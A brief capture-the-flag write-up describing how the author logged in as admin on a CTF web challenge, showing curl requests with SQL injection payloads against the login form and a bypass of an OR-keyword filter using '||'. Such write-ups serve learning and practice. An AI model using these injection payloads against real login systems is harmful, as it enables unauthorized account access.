### Solved by barrebas

A web challenge! For 100 points, we we're asked to log in as `admin`.

Pointing a browser to the challenge site gave us the option to login, or register. I decided to register `testz0r:testz0r` and logged in. The login then asked me to login as admin. Well, I had no password for admin. I went back to the register page, thinking there was a SQLi there. That might allow me to inject into the INSERT INTO statement and update the admin's password. Alas, no dice.

I again fired up `curl` and tried to get some SQLi going on the login form.

```bash
curl http://hack.bckdr.in/JUDGE/index.php --data "username=testz0r' or 'a'='a&password=testz0r"
<!DOCTYPE html>

<html>

<head>
<title>Login</title>
</head>

<body>
An Error occured
```

After messing around for a while, I remembered that sometimes, keywords like `OR` and `AND` are filtered. I tried to substitute `OR` for `||` and whadda-ya-know:

```bash
$ curl http://hack.bckdr.in/JUDGE/index.php --data "username=admin'||'1&password=testz0r"
<!DOCTYPE html>

<html>

<head>
<title>Login</title>
</head>

<body>
Flag is [REDACTED]
```

Done! One filter bypass was all it took.

